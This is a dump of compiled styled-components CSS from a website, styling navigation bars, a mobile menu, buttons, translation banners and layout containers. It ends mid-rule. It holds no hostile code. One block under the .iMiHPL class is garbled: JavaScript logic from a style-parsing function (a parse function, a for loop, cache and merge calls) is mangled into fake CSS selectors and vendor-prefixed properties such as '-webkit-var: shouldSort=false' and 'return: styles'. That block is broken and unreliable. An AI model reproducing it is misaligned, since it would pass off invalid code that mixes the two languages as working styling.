      .kbzFYA h4 {
        margin-bottom: 0.3em;
      }

      /*!sc*/
      .kbzFYA a {
        -webkit-text-decoration: none;
        text-decoration: none;
      }

      /*!sc*/
      data-styled.g34[id="Search__HitsWrapper-sc-1qm8xwy-1"] {
        content: "kbzFYA,"
      }

      /*!sc*/
      .dedPKg {
        padding: 1rem 2rem;
        width: 100%;
      }

      /*!sc*/
      data-styled.g44[id="SharedStyledComponents__Content-sc-1cr9zfr-3"] {
        content: "dedPKg,"
      }

      /*!sc*/
      .bcCiek {
        -webkit-flex: 0 0 50%;
        -ms-flex: 0 0 50%;
        flex: 0 0 50%;
        max-width: 75%;
        margin-right: 4rem;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .bcCiek {
          max-width: 100%;
          margin-right: 0;
        }
      }

      /*!sc*/
      data-styled.g46[id="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5"] {
        content: "bcCiek,"
      }

      /*!sc*/
      .iRRQao {
        width: 100%;
        padding: 4rem 0rem;
        margin-top: 2rem;
        background: #fcfcfc;
        box-shadow: inset 0px 1px 0px rgba(0, 0, 0, 0.1);
      }

      /*!sc*/
      data-styled.g49[id="SharedStyledComponents__GrayContainer-sc-1cr9zfr-8"] {
        content: "iRRQao,"
      }

      /*!sc*/
      .iLMavC {
        -webkit-text-decoration: none;
        text-decoration: none;
        margin-right: 2rem;
        color: #333;
      }

      /*!sc*/
      .iLMavC svg {
        fill: #666;
      }

      /*!sc*/
      .iLMavC:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .iLMavC:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      .iLMavC.active {
        font-weight: bold;
      }

      /*!sc*/
      data-styled.g52[id="SharedStyledComponents__NavLink-sc-1cr9zfr-11"] {
        content: "iLMavC,"
      }

      /*!sc*/
      .eOjDVk {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        margin-left: -1rem;
        margin-right: -1rem;
      }

      /*!sc*/
      data-styled.g55[id="SharedStyledComponents__CardContainer-sc-1cr9zfr-14"] {
        content: "eOjDVk,"
      }

      /*!sc*/
      .iuRocQ {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: inline-block;
        white-space: nowrap;
        padding: 0.5rem 0.75rem;
        font-size: 1rem;
        border-radius: 0.25em;
        text-align: center;
        cursor: pointer;
      }

      /*!sc*/
      .iuRocQ:disabled {
        opacity: 0.4;
        cursor: not-allowed;
      }

      /*!sc*/
      data-styled.g59[id="SharedStyledComponents__Button-sc-1cr9zfr-18"] {
        content: "iuRocQ,"
      }

      /*!sc*/
      .jddqFP {
        background-color: rgb(28, 28, 225);
        color: #fff;
        border: 1px solid transparent;
      }

      /*!sc*/
      .jddqFP:hover {
        background-color: rgba(28, 28, 225, 0.8);
      }

      /*!sc*/
      .jddqFP:active {
        background-color: #1616b4;
      }

      /*!sc*/
      data-styled.g60[id="SharedStyledComponents__ButtonPrimary-sc-1cr9zfr-19"] {
        content: "jddqFP,"
      }

      /*!sc*/
      .hhdXUp {
        display: none;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .hhdXUp {
          display: -webkit-box;
          display: -webkit-flex;
          display: -ms-flexbox;
          display: flex;
        }
      }

      /*!sc*/
      data-styled.g72[id="Mobile__Container-sc-zxc8gm-0"] {
        content: "hhdXUp,"
      }

      /*!sc*/
      .klOHLc {
        fill: #333;
      }

      /*!sc*/
      data-styled.g73[id="Mobile__MenuIcon-sc-zxc8gm-1"] {
        content: "klOHLc,"
      }

      /*!sc*/
      .dLNRLx {
        margin-left: 1rem;
      }

      /*!sc*/
      data-styled.g74[id="Mobile__MenuButton-sc-zxc8gm-2"] {
        content: "dLNRLx,"
      }

      /*!sc*/
      .hvwyGc {
        margin-right: 1rem;
      }

      /*!sc*/
      data-styled.g75[id="Mobile__OtherIcon-sc-zxc8gm-3"] {
        content: "hvwyGc,"
      }

      /*!sc*/
      .bCHBHX {
        position: fixed;
        background: hsla(0, 0%, 69.8%, 0.9);
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        height: 100vh;
      }

      /*!sc*/
      data-styled.g76[id="Mobile__MobileModal-sc-zxc8gm-4"] {
        content: "bCHBHX,"
      }

      /*!sc*/
      .cPYsfN {
        background: #fff;
        z-index: 99;
        position: fixed;
        left: 0;
        top: 0;
        height: 100vh;
        overflow: hidden;
        width: 100%;
        max-width: 450px;
      }

      /*!sc*/
      data-styled.g77[id="Mobile__MenuContainer-sc-zxc8gm-5"] {
        content: "cPYsfN,"
      }

      /*!sc*/
      .jXa-dMl {
        margin: 0 0.125rem;
        width: 1.5rem;
        height: 2.5rem;
        position: relative;
        stroke-width: 2px;
        z-index: 100;
      }

      /*!sc*/
      .jXa-dMl>path {
        stroke: #333;
        fill: none;
      }

      /*!sc*/
      .jXa-dMl:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .jXa-dMl:hover>path {
        stroke: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g78[id="Mobile__GlyphButton-sc-zxc8gm-6"] {
        content: "jXa-dMl,"
      }

      /*!sc*/
      .gBSEi {
        z-index: 101;
        padding: 1rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
      }

      /*!sc*/
      data-styled.g79[id="Mobile__SearchContainer-sc-zxc8gm-7"] {
        content: "gBSEi,"
      }

      /*!sc*/
      .cYxofY {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      .cYxofY>svg {
        fill: #333;
      }

      /*!sc*/
      data-styled.g80[id="Mobile__SearchHeader-sc-zxc8gm-8"] {
        content: "cYxofY,"
      }

      /*!sc*/
      .exWjZq {
        z-index: 102;
        cursor: pointer;
      }

      /*!sc*/
      .exWjZq>svg {
        fill: #333;
      }

      /*!sc*/
      data-styled.g81[id="Mobile__CloseIconContainer-sc-zxc8gm-9"] {
        content: "exWjZq,"
      }

      /*!sc*/
      .gYetwr {
        margin: 0;
        height: 100%;
        overflow-y: scroll;
        overflow-x: hidden;
        padding: 3rem 1rem 8rem;
      }

      /*!sc*/
      data-styled.g82[id="Mobile__MenuItems-sc-zxc8gm-10"] {
        content: "gYetwr,"
      }

      /*!sc*/
      .gXxMFO {
        margin: 0;
        margin-bottom: 3rem;
        list-style-type: none;
        list-style-image: none;
      }

      /*!sc*/
      data-styled.g83[id="Mobile__NavListItem-sc-zxc8gm-11"] {
        content: "gXxMFO,"
      }

      /*!sc*/
      .kuWShR {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin: 0;
      }

      /*!sc*/
      data-styled.g84[id="Mobile__StyledNavLink-sc-zxc8gm-12"] {
        content: "kuWShR,"
      }

      /*!sc*/
      .cGahMm {
        margin: 1rem 0;
        color: #333;
      }

      /*!sc*/
      data-styled.g85[id="Mobile__SectionTitle-sc-zxc8gm-13"] {
        content: "cGahMm,"
      }

      /*!sc*/
      .hghxUt {
        margin: 0;
      }

      /*!sc*/
      data-styled.g86[id="Mobile__SectionItems-sc-zxc8gm-14"] {
        content: "hghxUt,"
      }

      /*!sc*/
      .kdRQoZ {
        margin-bottom: 1rem;
        list-style-type: none;
        list-style-image: none;
        opacity: 0.7;
      }

      /*!sc*/
      .kdRQoZ:hover {
        opacity: 1;
      }

      /*!sc*/
      data-styled.g87[id="Mobile__SectionItem-sc-zxc8gm-15"] {
        content: "kdRQoZ,"
      }

      /*!sc*/
      .lkFvYp {
        background: #fff;
        border-top: 1px solid #ececec;
        padding-right: 1rem;
        padding-left: 1rem;
        margin-top: auto;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        height: 108px;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        width: 100%;
        max-width: 450px;
        z-index: 99;
      }

      /*!sc*/
      data-styled.g88[id="Mobile__BottomMenu-sc-zxc8gm-16"] {
        content: "lkFvYp,"
      }

      /*!sc*/
      .eJpqSs {
        -webkit-flex: 1 1 120px;
        -ms-flex: 1 1 120px;
        flex: 1 1 120px;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        cursor: pointer;
        color: #333;
      }

      /*!sc*/
      .eJpqSs>svg {
        fill: #333;
      }

      /*!sc*/
      .eJpqSs:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .eJpqSs:hover>svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g89[id="Mobile__BottomItem-sc-zxc8gm-17"] {
        content: "eJpqSs,"
      }

      /*!sc*/
      .eqKGZC {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        color: #333;
      }

      /*!sc*/
      .eqKGZC>svg {
        fill: #333;
      }

      /*!sc*/
      .eqKGZC:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .eqKGZC:hover>svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g90[id="Mobile__BottomLink-sc-zxc8gm-18"] {
        content: "eqKGZC,"
      }

      /*!sc*/
      .hkZTkJ {
        font-size: 0.875rem;
        line-height: 1.6;
        font-weight: 400;
        -webkit-letter-spacing: 0.04em;
        -moz-letter-spacing: 0.04em;
        -ms-letter-spacing: 0.04em;
        letter-spacing: 0.04em;
        margin-top: 0.5rem;
        text-transform: uppercase;
        text-align: center;
        opacity: 0.7;
      }

      /*!sc*/
      .hkZTkJ:hover {
        opacity: 1;
      }

      /*!sc*/
      data-styled.g91[id="Mobile__BottomItemText-sc-zxc8gm-19"] {
        content: "hkZTkJ,"
      }

      /*!sc*/
      .hNPbgI {
        color: #333;
        background: #f2f2f2;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        margin-top: 10vw;
        -webkit-align-self: center;
        -ms-flex-item-align: center;
        align-self: center;
        width: 280px;
        width: min(60vw, 280px);
        height: 280px;
        height: min(60vw, 280px);
        border-radius: 100%;
      }

      /*!sc*/
      data-styled.g92[id="Mobile__BlankSearchState-sc-zxc8gm-20"] {
        content: "hNPbgI,"
      }

      /*!sc*/
      .iGuESw {
        position: -webkit-sticky;
        position: sticky;
        top: 0;
        z-index: 1000;
        width: 100%;
      }

      /*!sc*/
      data-styled.g93[id="Nav__NavContainer-sc-1aprtmp-0"] {
        content: "iGuESw,"
      }

      /*!sc*/
      .dAFoOX {
        height: 4.75rem;
        padding: 1rem 2rem;
        box-sizing: border-box;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        background-color: #fff;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
      }

      /*!sc*/
      data-styled.g94[id="Nav__StyledNav-sc-1aprtmp-1"] {
        content: "dAFoOX,"
      }

      /*!sc*/
      .faUCsG {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        width: 100%;
        max-width: 1440px;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .faUCsG {
          -webkit-align-items: center;
          -webkit-box-align: center;
          -ms-flex-align: center;
          align-items: center;
          -webkit-box-pack: justify;
          -webkit-justify-content: space-between;
          -ms-flex-pack: justify;
          justify-content: space-between;
        }
      }

      /*!sc*/
      data-styled.g96[id="Nav__NavContent-sc-1aprtmp-3"] {
        content: "faUCsG,"
      }

      /*!sc*/
      .gjaVMk {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        width: 100%;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .gjaVMk {
          display: none;
        }
      }

      /*!sc*/
      data-styled.g97[id="Nav__InnerContent-sc-1aprtmp-4"] {
        content: "gjaVMk,"
      }

      /*!sc*/
      .jUJHKw {
        margin: 0;
        margin-left: 2rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        list-style-type: none;
        list-style-image: none;
      }

      /*!sc*/
      data-styled.g98[id="Nav__LeftItems-sc-1aprtmp-5"] {
        content: "jUJHKw,"
      }

      /*!sc*/
      .kQWBtS {
        margin: 0;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      data-styled.g99[id="Nav__RightItems-sc-1aprtmp-6"] {
        content: "kQWBtS,"
      }

      /*!sc*/
      .dDpgOC {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-right: 0;
        margin-left: 1rem;
      }

      /*!sc*/
      .dDpgOC:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g101[id="Nav__RightNavLink-sc-1aprtmp-8"] {
        content: "dDpgOC,"
      }

      /*!sc*/
      .igUcis {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      data-styled.g102[id="Nav__HomeLogoNavLink-sc-1aprtmp-9"] {
        content: "igUcis,"
      }

      /*!sc*/
      .euWmfq {
        opacity: 0.85;
      }

      /*!sc*/
      .euWmfq:hover {
        opacity: 1;
      }

      /*!sc*/
      data-styled.g103[id="Nav__HomeLogo-sc-1aprtmp-10"] {
        content: "euWmfq,"
      }

      /*!sc*/
      .bDRFLa {
        padding-left: 0.5rem;
      }

      /*!sc*/
      data-styled.g104[id="Nav__Span-sc-1aprtmp-11"] {
        content: "bDRFLa,"
      }

      /*!sc*/
      .bKrjAL {
        margin-left: 1rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      .bKrjAL:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g105[id="Nav__ThemeToggle-sc-1aprtmp-12"] {
        content: "bKrjAL,"
      }

      /*!sc*/
      .bJKbgw {
        fill: #333;
      }

      /*!sc*/
      data-styled.g106[id="Nav__NavIcon-sc-1aprtmp-13"] {
        content: "bJKbgw,"
      }

      /*!sc*/
      .iMiHPL {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: inline-block;
        padding: 0.5rem 0.75rem;
        font-size: 1rem;
        border-radius: 0.25em;
        text-align: center;
        cursor: pointer;
      }

      /*!sc*/
      .iMiHPL function parse(props) {
        -webkit-var: shouldSort=false;
        -moz-var: shouldSort=false;
        -ms-var: shouldSort=false;
        var: shouldSort=false;
        -webkit-var: isCacheDisabled=props.theme && props.theme.disableStyledSystemCache;
        -moz-var: isCacheDisabled=props.theme && props.theme.disableStyledSystemCache;
        -ms-var: isCacheDisabled=props.theme && props.theme.disableStyledSystemCache;
        var: isCacheDisabled=props.theme && props.theme.disableStyledSystemCache;
        return: styles;
      }

      /*!sc*/
      .iMiHPL function parse(props) for (var key in props) {
        if: ( !config[key]) continue;
        -webkit-var: sx=config[key];
        -moz-var: sx=config[key];
        -ms-var: sx=config[key];
        var: sx=config[key];
        -webkit-var: raw=props[key];
        -moz-var: raw=props[key];
        -ms-var: raw=props[key];
        var: raw=props[key];
        -webkit-var: scale=get(props.theme, sx.scale, sx.defaults);
        -moz-var: scale=get(props.theme, sx.scale, sx.defaults);
        -ms-var: scale=get(props.theme, sx.scale, sx.defaults);
        var: scale=get(props.theme, sx.scale, sx.defaults);
        object_assign_default()(styles, sx(raw, scale, props));
      }

      /*!sc*/
      .iMiHPL function parse(props) for (var key in props) if (typeof raw==='object') {
        cache.breakpoints: = !isCacheDisabled && cache.breakpoints || get(props.theme, 'breakpoints', defaults.breakpoints);
        continue;
      }

      /*!sc*/
      .iMiHPL function parse(props) for (var key in props) if (typeof raw==='object') if (Array.isArray(raw)) {
        cache.media: = !isCacheDisabled && cache.media || [null].concat(cache.breakpoints.map(createMediaQuery));
        styles: =merge(styles, parseResponsiveStyle(cache.media, sx, scale, raw, props));
        continue;
      }

      /*!sc*/
      .iMiHPL function parse(props) for (var key in props) if (typeof raw==='object') if (raw !==null) {
        styles: =merge(styles, parseResponsiveObject(cache.breakpoints, sx, scale, raw, props));
        shouldSort: =true;
      }

      /*!sc*/
      .iMiHPL function parse(props) if (shouldSort) {
        styles: =sort(styles);
      }

      /*!sc*/
      data-styled.g124[id="ButtonLink__StyledLinkButton-sc-8betkf-0"] {
        content: "iMiHPL,"
      }

      /*!sc*/
      .eClriT {
        background-color: rgb(28, 28, 225);
        color: #fff !important;
        border: 1px solid transparent;
      }

      /*!sc*/
      .eClriT:hover {
        background-color: rgba(28, 28, 225, 0.8);
        box-shadow: 4px 4px 0px 0px #D2D2F9;
      }

      /*!sc*/
      .eClriT:active {
        background-color: #1616b4;
      }

      /*!sc*/
      data-styled.g126[id="ButtonLink__PrimaryLink-sc-8betkf-2"] {
        content: "eClriT,"
      }

      /*!sc*/
      .fWQsqc {
        color: #333;
        border: 1px solid #333;
        background-color: transparent;
      }

      /*!sc*/
      .fWQsqc:hover {
        color: rgb(28, 28, 225);
        border: 1px solid rgb(28, 28, 225);
        box-shadow: 4px 4px 0px 0px #D2D2F9;
      }

      /*!sc*/
      .fWQsqc:active {
        background-color: #e5e5e5;
      }

      /*!sc*/
      data-styled.g127[id="ButtonLink__SecondaryLink-sc-8betkf-3"] {
        content: "fWQsqc,"
      }

      /*!sc*/
      .elpFuD {
        font-weight: 700;
        line-height: 100%;
        margin-top: 0;
        margin-bottom: 0;
      }

      /*!sc*/
      data-styled.g130[id="TranslationBanner__H3-sc-cd94ib-0"] {
        content: "elpFuD,"
      }

      /*!sc*/
      .jJbcq {
        display: none;
        bottom: 2rem;
        right: 2rem;
        position: fixed;
        z-index: 99;
      }

      /*!sc*/
      @media (max-width:768px) {
        .jJbcq {
          bottom: 0rem;
          right: 0rem;
        }
      }

      /*!sc*/
      data-styled.g131[id="TranslationBanner__BannerContainer-sc-cd94ib-1"] {
        content: "jJbcq,"
      }

      /*!sc*/
      .cLEePD {
        padding: 1rem;
        max-height: 100%;
        max-width: 600px;
        background: #e8e8fc;
        color: #333;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        box-shadow: rgba(0, 0, 0, 0.16) 0px 2px 4px 0px;
        border-radius: 2px;
      }

      /*!sc*/
      @media (max-width:768px) {
        .cLEePD {
          max-width: 100%;
          box-shadow: 0px -4px 10px 0px #333 10%;
        }
      }

      /*!sc*/
      data-styled.g132[id="TranslationBanner__StyledBanner-sc-cd94ib-2"] {
        content: "cLEePD,"
      }

      /*!sc*/
      .jiZNpa {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: flex-start;
        -webkit-box-align: flex-start;
        -ms-flex-align: flex-start;
        align-items: flex-start;
        margin: 1rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .jiZNpa {
          margin-top: 2.5rem;
        }
      }

      /*!sc*/
      data-styled.g133[id="TranslationBanner__BannerContent-sc-cd94ib-3"] {
        content: "jiZNpa,"
      }

      /*!sc*/
      .dOewRO {
        position: absolute;
        top: 0;
        right: 0;
        margin: 1rem;
      }

      /*!sc*/
      data-styled.g134[id="TranslationBanner__BannerClose-sc-cd94ib-4"] {
        content: "dOewRO,"
      }

      /*!sc*/
      .cEauOV {
        cursor: pointer;
      }

      /*!sc*/
      data-styled.g135[id="TranslationBanner__BannerCloseIcon-sc-cd94ib-5"] {
        content: "cEauOV,"
      }

      /*!sc*/
      .nChYp {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-bottom: 1rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .nChYp {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          -webkit-align-items: flex-start;
          -webkit-box-align: flex-start;
          -ms-flex-align: flex-start;
          align-items: flex-start;
        }
      }

      /*!sc*/
      data-styled.g136[id="TranslationBanner__Row-sc-cd94ib-6"] {
        content: "nChYp,"
      }

      /*!sc*/
      .gXNXMi {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      @media (max-width:414px) {
        .gXNXMi {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          -webkit-align-items: flex-start;
          -webkit-box-align: flex-start;
          -ms-flex-align: flex-start;
          align-items: flex-start;
        }
      }

      /*!sc*/
      data-styled.g137[id="TranslationBanner__ButtonRow-sc-cd94ib-7"] {
        content: "gXNXMi,"
      }

      /*!sc*/
      .hTWLVy {
        padding-top: 0.5rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .hTWLVy {
          margin-bottom: 1rem;
        }
      }

      /*!sc*/
      data-styled.g138[id="TranslationBanner__StyledEmoji-sc-cd94ib-8"] {
        content: "hTWLVy,"
      }

      /*!sc*/
      .kUKdfA {
        margin-left: 0.5rem;
        color: #333;
        border: 1px solid #333;
        background-color: transparent;
      }

      /*!sc*/
      @media (max-width:414px) {
        .kUKdfA {
          margin-left: 0rem;
          margin-top: 0.5rem;
        }
      }

      /*!sc*/
      data-styled.g139[id="TranslationBanner__SecondaryButtonLink-sc-cd94ib-9"] {
        content: "kUKdfA,"
      }

      /*!sc*/
      .kIfJin {
        font-weight: 700;
        line-height: 100%;
        margin-top: 0;
        margin-bottom: 0;
      }

      /*!sc*/
      data-styled.g140[id="TranslationBannerLegal__H3-sc-1df4kz4-0"] {
        content: "kIfJin,"
      }

      /*!sc*/
      .eZKsbu {
        display: none;
        bottom: 2rem;
        right: 2rem;
        position: fixed;
        z-index: 99;
      }

      /*!sc*/
      @media (max-width:768px) {
        .eZKsbu {
          bottom: 0rem;
          right: 0rem;
        }
      }

      /*!sc*/
      data-styled.g141[id="TranslationBannerLegal__BannerContainer-sc-1df4kz4-1"] {
        content: "eZKsbu,"
      }

      /*!sc*/
      .ckMYeb {
        padding: 1rem;
        max-height: 100%;
        max-width: 600px;
        background: #e8e8fc;
        color: #333;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        box-shadow: rgba(0, 0, 0, 0.16) 0px 2px 4px 0px;
        border-radius: 2px;
      }

      /*!sc*/
      @media (max-width:768px) {
        .ckMYeb {
          max-width: 100%;
          box-shadow: 0px -4px 10px 0px #333 10%;
        }
      }

      /*!sc*/
      data-styled.g142[id="TranslationBannerLegal__StyledBanner-sc-1df4kz4-2"] {
        content: "ckMYeb,"
      }

      /*!sc*/
      .intGem {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: flex-start;
        -webkit-box-align: flex-start;
        -ms-flex-align: flex-start;
        align-items: flex-start;
        margin: 1rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .intGem {
          margin-top: 2.5rem;
        }
      }

      /*!sc*/
      data-styled.g143[id="TranslationBannerLegal__BannerContent-sc-1df4kz4-3"] {
        content: "intGem,"
      }

      /*!sc*/
      .hMvMKu {
        position: absolute;
        top: 0;
        right: 0;
        margin: 1rem;
      }

      /*!sc*/
      data-styled.g144[id="TranslationBannerLegal__BannerClose-sc-1df4kz4-4"] {
        content: "hMvMKu,"
      }

      /*!sc*/
      .bhaYvl {
        cursor: pointer;
      }

      /*!sc*/
      data-styled.g145[id="TranslationBannerLegal__BannerCloseIcon-sc-1df4kz4-5"] {
        content: "bhaYvl,"
      }

      /*!sc*/
      .cJRPhR {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-bottom: 1rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .cJRPhR {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          -webkit-align-items: flex-start;
          -webkit-box-align: flex-start;
          -ms-flex-align: flex-start;
          align-items: flex-start;
        }
      }

      /*!sc*/
      data-styled.g146[id="TranslationBannerLegal__Row-sc-1df4kz4-6"] {
        content: "cJRPhR,"
      }

      /*!sc*/
      .kXSENe {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      @media (max-width:414px) {
        .kXSENe {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          -webkit-align-items: flex-start;
          -webkit-box-align: flex-start;
          -ms-flex-align: flex-start;
          align-items: flex-start;
        }
      }

      /*!sc*/
      data-styled.g147[id="TranslationBannerLegal__ButtonRow-sc-1df4kz4-7"] {
        content: "kXSENe,"
      }

      /*!sc*/
      .dRuawC {
        padding-top: 0.5rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .dRuawC {
          margin-bottom: 1rem;
        }
      }

      /*!sc*/
      data-styled.g148[id="TranslationBannerLegal__StyledEmoji-sc-1df4kz4-8"] {
        content: "dRuawC,"
      }

      /*!sc*/
      .giUnZR {
        background-color: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g149[id="SkipLink__Div-sc-1ysqk2q-0"] {
        content: "giUnZR,"
      }

      /*!sc*/
      .dTtKmI {
        line-height: 2rem;
        position: absolute;
        top: -3rem;
        margin-left: 0.5rem;
        color: #fff;
        -webkit-text-decoration: none;
        text-decoration: none;
      }

      /*!sc*/
      .dTtKmI:focus {
        position: static;
      }

      /*!sc*/
      data-styled.g150[id="SkipLink__Anchor-sc-1ysqk2q-1"] {
        content: "dTtKmI,"
      }

      /*!sc*/
      .mXCTw {
        position: relative;
        margin: 0px auto;
        min-height: 75vh;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-flow: column;
        -ms-flex-flow: column;
        flex-flow: column;
      }

      /*!sc*/
      @media (min-width:1024px) {
        .mXCTw {
          max-width: 1504px;
        }
      }

      /*!sc*/
      data-styled.g151[id="Layout__ContentContainer-sc-19910io-0"] {
        content: "mXCTw,"
      }

      /*!sc*/
      .gqazVg {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .gqazVg {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
        }
      }

      /*!sc*/
      data-styled.g152[id="Layout__MainContainer-sc-19910io-1"] {
        content: "gqazVg,"
      }

      /*!sc*/
      .kCJhKM {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        width: 100%;
      }

      /*!sc*/
      data-styled.g153[id="Layout__MainContent-sc-19910io-2"] {
        content: "kCJhKM,"
      }

      /*!sc*/
      .dliKfQ {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: space-around;
        -webkit-justify-content: space-around;
        -ms-flex-pack: space-around;
        justify-content: space-around;
        -webkit-align-items: flex-start;
        -webkit-box-align: flex-start;
        -ms-flex-align: flex-start;
